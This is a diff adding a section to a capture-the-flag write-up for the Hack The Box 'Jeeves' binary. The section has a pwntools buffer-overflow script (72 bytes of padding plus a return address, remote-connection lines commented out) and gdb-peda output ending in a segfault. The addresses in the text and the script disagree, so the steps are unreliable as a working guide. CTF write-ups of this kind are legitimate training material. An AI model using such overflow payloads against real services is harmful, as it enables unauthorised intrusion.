@@ -219,6 +219,72 @@ gdb-peda$
 
 ```
 
-Try to jumb just after cmp,jne -> 0x000055555555523f
+Try to jumb just to 0x555555556055. Create python script with pwn:
 
+```python
+from pwn import *
 
+offset = b"A" * 72
+jump = p64(0x555555556060, endian="little")
+serverip = "178.62.13.127"
+port = 30495
+
+exploit = offset + jump 
+
+#server = remote(serverip, port)
+#server = elf.process()
+#server.sendlineafter("?", exploit)
+#server.interactive()
+
+f = open('exploit.bin', 'wb')
+f.write(exploit)
+f.close()
+
+```
+
+Run gdb jeeves:
+
+```shell
+gdb-peda$ r < exploit.bin
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x7fffffffe6e8 --> 0x7fffffffe9c3 ("/home/darthv/git/badorius/vulnhub/hackthebox/Jeeves/Files/jeeves")
+RCX: 0x0 
+RDX: 0x0 
+RSI: 0x5555555592a0 ("May I have your name? Hello ", 'A' <repeats 72 times>, "``UUUU, hope you have a good day!\n")
+RDI: 0x7fffffffe030 --> 0x7ffff7dfc160 (<funlockfile>:	endbr64)
+RBP: 0x4141414141414141 ('AAAAAAAA')
+RSP: 0x7fffffffe5e0 --> 0x7fffffffe600 --> 0x7fffffffe6e8 --> 0x7fffffffe9c3 ("/home/darthv/git/badorius/vulnhub/hackthebox/Jeeves/Files/jeeves")
+RIP: 0x555555556060 ("Pleased to make your acquaintance. Here's a small gift: %s\n")
+R8 : 0x0 
+R9 : 0x73 ('s')
+R10: 0x0 
+R11: 0x202 
+R12: 0x0 
+R13: 0x7fffffffe6f8 --> 0x7fffffffea04 ("SHELL=/bin/bash")
+R14: 0x0 
+R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x555555554000 --> 0x10102464c457f
+EFLAGS: 0x10216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x555555556058:	addr32 cs je 0x5555555560d4
+   0x55555555605c:	je     0x55555555605e
+   0x55555555605e:	add    BYTE PTR [rax],al
+=> 0x555555556060:	push   rax
+   0x555555556061:	ins    BYTE PTR es:[rdi],dx
+   0x555555556062:	gs (bad) 
+   0x555555556064:	jae    0x5555555560cb
+   0x555555556066:	and    BYTE PTR fs:[rdi+rbp*2+0x20],dh
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe5e0 --> 0x7fffffffe600 --> 0x7fffffffe6e8 --> 0x7fffffffe9c3 ("/home/darthv/git/badorius/vulnhub/hackthebox/Jeeves/Files/jeeves")
+0008| 0x7fffffffe5e8 --> 0x5555555551e9 (<main>:	endbr64)
+0016| 0x7fffffffe5f0 --> 0x155554040 
+0024| 0x7fffffffe5f8 --> 0x7fffffffe6e8 --> 0x7fffffffe9c3 ("/home/darthv/git/badorius/vulnhub/hackthebox/Jeeves/Files/jeeves")
+0032| 0x7fffffffe600 --> 0x7fffffffe6e8 --> 0x7fffffffe9c3 ("/home/darthv/git/badorius/vulnhub/hackthebox/Jeeves/Files/jeeves")
+0040| 0x7fffffffe608 --> 0x84caa9bc7013e49a 
+0048| 0x7fffffffe610 --> 0x0 
+0056| 0x7fffffffe618 --> 0x7fffffffe6f8 --> 0x7fffffffea04 ("SHELL=/bin/bash")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000555555556060 in ?? ()
+```
